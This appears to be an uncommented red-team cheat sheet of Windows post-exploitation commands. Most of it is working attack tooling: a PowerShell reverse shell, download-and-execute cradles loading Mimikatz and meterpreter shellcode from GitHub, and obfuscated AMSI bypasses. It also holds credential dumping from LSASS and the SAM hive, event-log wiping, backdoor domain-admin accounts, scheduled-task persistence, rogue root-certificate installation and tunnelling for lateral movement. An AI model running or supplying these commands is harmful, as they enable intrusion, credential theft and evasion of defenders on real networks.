----------------------------------------------------------------------------------------------------------------------------------------

powershell -noexit -ExecutionPolicy Unrestricted "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.2',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"

powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'"

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokeholacode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"

powershell "IEX (New-Object Net.WebClient).DownloadString('file://C:/Users/Public/System/Invoke-Shellcode.ps1'); Invoke-Adios -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1'); Invoke-Mimiadios -DumpCreds

powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');Invoke-Mimiadios -DumpCreds

powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')

powershell -version 2 -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')

[ScriptBlock]."Get`Fiel`d"('signatures','N'+'onPublic,Static').SetValue($NULL,(New-Object Collections.Generic.HashSet[string]));$e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');Invoke-Adios -AdiosCreds

powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/AMSIScanBuffer-Bypass/master/AMSIScanBufferBypass.ps1');if([Bypass.AMSI]::Disable() -eq '0'){IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1'); Invoke-Adios -AdiosCreds}"

cd %temp% && powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/analyticsearch/7b614f8badabe5bedf1d88056197db76/raw/13966117e4ba13be5da0c4dc44ac9ebfd61fe22a','katz.cs'); && cd c:\Windows\Microsoft.NET\Framework64\v4.* && csc.exe /unsafe /reference:System.IO.Compression.dll /out:katz.exe %temp%\\katz.cs && InstallUtil.exe /logfile= /LogToConsole=false /U katz.exe && katz.exe log privilege::debug sekurlsa::logonpasswords exit && del katz.* && move mimikatz.log %temp%\\katz.log && cd %temp% && del %temp%\\katz.cs

powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"

[Net.ServicePointManager]::SecurityProtocol
----------------------------------------------------------------------------------------------------------------------------------------

Linux:
date +'%d-%m-%Y %H:%M:%S %Z'

Windows:
echo %date% %time:~0,8%

for /f "tokens=*" %i in ('tzutil /g') do (set zone=%i)
echo %date% %time:~0,8% %zone%

for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl "%1"
wevtutil.exe cl Security && wevtutil.exe cl System
----------------------------------------------------------------------------------------------------------------------------------------

schtasks /create /tn "Driver Support" /tr "cmd.exe /Q /C C:\Support\driver.bat" /sc DAILY /st 00:11 /f /RI 60 /du 24:00
schtasks /Query /FO List /v /TN "Driver Support"
schtasks /Run /TN "Driver Support"

sp_configure 'show advanced options',1;
RECONFIGURE;
exec sp_configure 'xp_cmdshell',1;
RECONFIGURE;

exec xp_cmdshell 'whoami'

osql.exe -S <server> -U <username> -P <password> -Q "xp_cmdshell 'whoami'"

net localgroup administrators && net user username password /add && net localgroup administrators username /add && net localgroup "Remote Desktop Users" username /add

net user username password /add /domain && net group "Domain Admins" username /add /domain

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

----------------------------------------------------------------------------------------------------------------------------------------

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME

net view
net use q: \\share_name
wmic logicaldisk get name
net use q: /delete

7za.exe a -tzip analytic.zip C:\support\

7z a -v50M <new_filename_to_create>.zip <Path_to_file_or_folder_to_compress_by_splitting>

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL

run post/windows/manage/migrate

plink -l username -pw password -R 3389:192.168.1.2:3389 192.168.2.2 -P 22
portfwd add -l 3389 -p 3389 -r 192.168.1.2

nc -l -p 8888 -c "nc 192.168.1.2 3389"
rdesktop 192.168.1.3:8888

ssh -L 0.0.0.0:8888:192.168.1.2:3389 127.0.0.1
rdesktop 192.168.1.3:8888

reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

query session /server:
reset session 1

----------------------------------------------------------------------------------------------------------------------------------------

Import-Module PowerUpSQL.psd1;Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username <username> -password <password>

----------------------------------------------------------------------------------------------------------------------------------------

goddi-windows-amd64.exe -username=<username> -password="<password>" -domain="<domainname.com>" -dc="<dc_ip>" -unsafe

----------------------------------------------------------------------------------------------------------------------------------------

for($i=1;$i -lt 255;$i++){$ip="192.168.1."+$i;echo "" $ip "";$shares = net view \\$ip /all | select -Skip 7 | ?{$_ -match 'disk*'} | %{$_ -match '^(.+?)\s+Disk*'|out-null;$matches[1]};$shares;echo "-----------------------------------"}

for($i=1;$i -lt 255;$i++){Write-Host ("[*] 192.168.1." + $i); Get-WmiObject -class win32_share -ComputerName ("192.168.1." + $i)}

----------------------------------------------------------------------------------------------------------------------------------------

cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/scriptcalc.sct

----------------------------------------------------------------------------------------------------------------------------------------

C:\Windows\PrintDialog\PrintDialog.exe 
(or)
C:\Windows\System32\PrintDialogHost.exe

uses LoadLibrary to load PrintDialog.dll, so if you copy it to a different folder and drop your own PrintDialog.dll there you will be able to load it via a signed .exe once you execute PrintDialog.exe

----------------------------------------------------------------------------------------------------------------------------------------

$x02 = curl.exe --basic https://gist.githubusercontent.com/homjxi0e/daa8657aab3fa7535aa0a1146378faf4/raw/46ff2438e4e2bea4910981336efc7e8b66afcaaa/ss.raw;[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript');[Microsoft.JScript.Eval]::JScriptEvaluate($x02,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

$Microsoft = echo 'var Windows = new ActiveXObject("WScript.Shell");Windows.Run("calc.exe")';[Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript');[Microsoft.JScript.Eval]::JScriptEvaluate($Microsoft,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

----------------------------------------------------------------------------------------------------------------------------------------

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/analyticsearch/commercial/master/netscan64.exe C:\Users\Public\net.log:netscan.exe

----------------------------------------------------------------------------------------------------------------------------------------

wmic process call create calc
wmic path win32_process call create calc

----------------------------------------------------------------------------------------------------------------------------------------

To Check AMSI Log:

Get-MpThreatDetection | Sort InitialDetectionTime -Descending | select -First 1
Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List

----------------------------------------------------------------------------------------------------------------------------------------

(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}

----------------------------------------------------------------------------------------------------------------------------------------

Enable-PSRemoting –force
Set-Service WinRM -StartMode Automatic
Set-Item WSMan:localhost\client\trustedhosts -value *

Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}
Get-Item WSMan:\localhost\Client\TrustedHosts

Invoke-Command –Comp <FQDN> -Cred domain\username -ScriptBlock {Hostname}
Invoke-Command –Comp <FQDN> -Cred domain\username -FilePath C:\Script.ps1

Get-ADComputer -Filter *  -properties name | select @{Name="computername";Expression={$_."name"}} | Invoke-Command -ScriptBlock {hostname}

Enter-PsSession –Comp <FQDN> -Cred domain\username

New-PSSession –Comp <FQDN> -Cred domain\username
Get-PSSession
Enter-PsSession –id 1
Invoke-Command -Session (Get-PSSession) -ScriptBlock {Hostname}
Get-PSSession | Disconnect-PSSession

New-PSDrive -PSProvider ActiveDirectory -Name RemoteADS -Root "" -Server <FQDN> -credential domain\username;cd RemoteADS:;Get-ADComputer -Filter * -Properties name  | select @{Name="ComputerName";Expression={$_."name"}} | New-PSSession

----------------------------------------------------------------------------------------------------------------------------------------
certutil.exe /addstore /f /v root ssl.crt

certmgr.exe /add ssl.crt /s root /all

rundll32 cryptext.dll,CryptExtAddCER ssl.crt
**********************************************************************************************************************
start rundll32 cryptext.dll,CryptExtAddCER ssl.crt && type sendkeys01.txt | powershell -noprofile - && start rundll32 cryptext.dll,CryptExtAddCER ssl.crt && type sendkeys02.txt | powershell -noprofile -

<--- Windows 7 - sendkeys01.txt --->
$windows = New-Object -ComObject wscript.shell;Add-Type -AssemblyName System.Windows.Forms;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('N'+'P'+'r');Start-Sleep -s 2;$windows.AppActivate('Select Certificate Store');[System.Windows.Forms.SendKeys]::SendWait('T'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('N'+'~');Start-Sleep -s 2;$windows.AppActivate('Security Warning');[System.Windows.Forms.SendKeys]::SendWait('Y');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~');

<--- Windows 7 - sendkeys02.txt --->
$windows = New-Object -ComObject wscript.shell;Add-Type -AssemblyName System.Windows.Forms;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('N'+'P'+'r');Start-Sleep -s 2;$windows.AppActivate('Select Certificate Store');[System.Windows.Forms.SendKeys]::SendWait('Th'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('N'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~');

<--- Windows 10 - sendkeys01.txt --->
$windows = New-Object -ComObject wscript.shell;Add-Type -AssemblyName System.Windows.Forms;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~'+'P'+'r');Start-Sleep -s 2;$windows.AppActivate('Select Certificate Store');[System.Windows.Forms.SendKeys]::SendWait('T'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~'+'~');Start-Sleep -s 2;$windows.AppActivate('Security Warning');[System.Windows.Forms.SendKeys]::SendWait('Y');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~')

<--- Windows 10 - sendkeys02.txt --->
$windows = New-Object -ComObject wscript.shell;Add-Type -AssemblyName System.Windows.Forms;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~'+'P'+'r');Start-Sleep -s 2;$windows.AppActivate('Select Certificate Store');[System.Windows.Forms.SendKeys]::SendWait('Th'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~'+'~');Start-Sleep -s 2;$windows.AppActivate('Certificate Import Wizard');[System.Windows.Forms.SendKeys]::SendWait('~')

----------------------------------------------------------------------------------------------------------------------------------------

pdftk 01.pdf output 02.pdf uncompress
sed -e "s/watermarktextstring/ /" 02.pdf > 03.pdf
pdftk 03.pdf output 04.pdf compress

----------------------------------------------------------------------------------------------------------------------------------------

wget -r -np -k https://<URL>/

----------------------------------------------------------------------------------------------------------------------------------------

sed -i -e 's/192.168.6.135/192.168.3.136/g' file.txt

----------------------------------------------------------------------------------------------------------------------------------------

REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v SecureProtocols /t REG_DWORD /d 2688 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp" /v DefaultSecureProtocols /t REG_DWORD /d 2688 /f
REG ADD "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp" /v DefaultSecureProtocols /t REG_DWORD /d 2688 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v DisabledByDefault /t REG_DWORD /d 1 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v Enabled /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v Enabled /t REG_DWORD /d 0 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client" /v Enabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v Enabled /t REG_DWORD /d 1 /f

----------------------------------------------------------------------------------------------------------------------------------------
